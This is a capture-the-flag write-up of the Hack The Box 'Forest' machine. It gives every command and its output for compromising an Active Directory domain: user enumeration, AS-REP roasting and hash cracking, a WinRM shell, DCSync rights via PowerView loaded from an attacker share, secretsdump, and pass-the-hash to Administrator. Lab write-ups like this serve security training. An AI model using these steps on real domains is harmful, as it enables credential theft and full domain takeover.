![[Pasted image 20210731221138.png]]

Starting with nmap as always. I've already preran a quickscan and will run only on the other ports:
```
% nmap -p `cat logs/tcp-simple.nmap | grep open | cut -d/ -f1 | tr "\n" "," | sed "s/,$//"` -sC -sV -Pn -oA logs/nmap-tcpscripts $IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 22:21 AEST
Nmap scan report for FOREST.htb.local (10.10.10.161)
Host is up (0.025s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-31 12:20:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49905/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h18m41s, deviation: 4h02m31s, median: -1m19s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-07-31T05:21:36-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-07-31T12:21:34
|_  start_date: 2021-07-31T12:13:26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.09 seconds
```

Running enum4linux we get a list of users returned:
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Extracting the usernames:
```
% cat users.txt | cut -d: -f2 | cut -d" " -f1 | tr -d "[]" | sort -u 
$331000-VK4ADACQNUCA
Administrator
andy
DefaultAccount
Guest
HealthMailbox0659cc1
HealthMailbox670628e
HealthMailbox6ded678
HealthMailbox7108a4e
HealthMailbox83d6781
HealthMailbox968e74d
HealthMailboxb01ac64
HealthMailboxc0a90c9
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxfd87238
krbtgt
lucinda
mark
santi
sebastien
SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb
SM_681f53d4942840e18
SM_75a538d3025e4db9a
SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b
svc-alfresco
```

We can also get users using rpcclient:
```
% rpcclient -U "" -N $IP
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Tried AS-REP roasting however none of the users have the UF_DONT_REQUIRE_PREAUTH set:
```
% GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -no-pass -usersfile asdf.txt -format hashcat
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0d9c2ca1d002fa4733b32a9420683cc3$d82bc691dbaacfc9d0c8b542b2f43e483c98cfb76d381e188de218627762b91646f9f50fd3b36382381f960af5fa249dd42c0ddb0da1c1b7f33992897d7f32fce81caf989dbbea584906d859d0ff8bc442b7c68c9126f898b61074c54767120adbd86def5ad06941a48a89fe93d83226bb1bc75e093bd6c4a094e826088c0f235bdf3871456d482eef9893d63d34c3c96e95ad15ff39e82d860793cb2aceaf7d2c069f665bf96d8f5115e9f78e3485b04c1e6644a0cfe10fabebb6a8e509f991f2b3740d588ea184650ffbaa879fe44abc9c9e3d3139197f89cad02228ce3542504defb3a2e9

```

The attack worked for 1 service account:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0d9c2ca1d002fa4733b32a9420683cc3$d82bc691dbaacfc9d0c8b542b2f43e483c98cfb76d381e188de218627762b91646f9f50fd3b36382381f960af5fa249dd42c0ddb0da1c1b7f33992897d7f32fce81caf989dbbea584906d859d0ff8bc442b7c68c9126f898b61074c54767120adbd86def5ad06941a48a89fe93d83226bb1bc75e093bd6c4a094e826088c0f235bdf3871456d482eef9893d63d34c3c96e95ad15ff39e82d860793cb2aceaf7d2c069f665bf96d8f5115e9f78e3485b04c1e6644a0cfe10fabebb6a8e509f991f2b3740d588ea184650ffbaa879fe44abc9c9e3d3139197f89cad02228ce3542504defb3a2e9
```

Cracking the hash with john:
```
% john test --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:03 DONE (2021-07-31 23:03) 0.2702g/s 1104Kp/s 1104Kc/s 1104KC/s s428237..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Credentials:
```
u: svc-alfresco
p: s3rvice
```

After some enum using crackmapexec, we find that we can login to winrm: 
```
% crackmapexec winrm 10.10.10.161 -d htb.local -u "svc-alfresco" -p "s3rvice"
WINRM       10.10.10.161    5985   10.10.10.161     [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   10.10.10.161     [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Using evil-winrm we can get a shell:
```
% docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i $IP -u "svc-alfresco" -p "s3rvice"

Evil-WinRM shell v3.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type
^C

Warning: Press "y" to exit, press any other key to continue

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
ls
*Evil-WinRM* PS C:\Users\svc-alfresco> ls


    Directory: C:\Users\svc-alfresco


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/23/2019   2:16 PM                Desktop
d-r---        9/22/2019   4:02 PM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos


*Evil-WinRM* PS C:\Users\svc-alfresco> cd "C:/Users/svc-alfresco/Desktop/"
l*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   2:16 PM             32 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
e5e4e47ae7022664cda6eb013fb0d9ed
```

We can use a bloodhound ingestor to retrieve all details from AD. https://github.com/fox-it/BloodHound.py can run from a remote box which means you don't have to login to the target host:
```
% python bloodhound.py -u svc-alfresco  -p s3rvice -d htb.local -gc htb.local -ns $IP -c all
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 31 users
INFO: Found 75 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FOREST.htb.local
INFO: Querying computer: EXCH01.htb.local
INFO: Done in 00M 09S
```

Used Bloodhound to identify the fastest path to htb.local domain:
![[Pasted image 20210801012609.png]]

Based on the above Bloodhound graph, we can add ourselves to the "Exchange Windows Permissions" groups since have have generic all permissions on it:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "exchange windows permissions" svc-alfresco /add /domain
The command completed successfully.
```

Then we have WriteDacl permission on the AD which allows us to gain full control of the AD.

This vulnerability is explained in
https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md 

We'll use Powerview to make this easier use the help from Bloodhound to exploit it.

Importing powerview using the following commands:
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-module \\10.10.14.23\asdf\asdf.ps1
```

We then use the exploit from Bloodhound (had to update it for it to work):
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity svc-alfresco -Rights DCSync -TargetIdentity "DC=htb,DC=local"
```

At this point we have the correct permissions and we can use `secretsdump.py` to retrieve hashes:
```
python3 secretsdump.py svc-alfresco:s3rvice@$IP
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...
[*] Cleaning up... 
```

Using pass the hash we can get Administrator on the box:
```
% docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i $IP -u "Administrator" -H "32693b11e6aa90eb43d32c72a07ceea6"

Evil-WinRM shell v3.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   3:46 PM         770279 PowerView.ps1
-ar---        10/6/2019  12:46 PM            664 revert.ps1
-ar---        9/23/2019   3:05 PM             51 users.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/18/2019  10:09 AM                Administrator
d-r---       11/20/2016   6:39 PM                Public
d-----        9/22/2019   3:29 PM                sebastien
d-----        9/22/2019   4:02 PM                svc-alfresco


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/20/2019   4:04 PM                Contacts
d-r---        9/23/2019   2:15 PM                Desktop
d-r---        9/23/2019   3:46 PM                Documents
d-r---        9/20/2019   4:04 PM                Downloads
d-r---        9/20/2019   4:04 PM                Favorites
d-r---        9/20/2019   4:04 PM                Links
d-r---        9/20/2019   4:04 PM                Music
d-r---        9/20/2019   4:04 PM                Pictures
d-r---        9/20/2019   4:04 PM                Saved Games
d-r---        9/20/2019   4:04 PM                Searches
d-r---        9/20/2019   4:04 PM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   2:15 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
f048153f202bbb2f82622b04d79129cc
```


**Additional Bloodhound images**

Service account to Valuable targets:
![[Pasted image 20210801012204.png]]

Path from SVC-ALFRESCO to HTB.LOCAL:
![[Pasted image 20210801011722.png]]


**Additional notes**
If you're attempting to exploit the svc-alfresco user, you'll have to exploit it within 1 minute due to a background script removing all your progress to allow others to exploit the box:
```
Import-Module C:\Users\Administrator\Documents\PowerView.ps1

$users = Get-Content C:\Users\Administrator\Documents\users.txt

while($true)

{
    Start-Sleep 60

    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    Foreach ($user in $users) {
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        if ($groups -ne $null){
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}
```

An alternative way is to create a new user and elevate that user instead of the svc-alfredo user.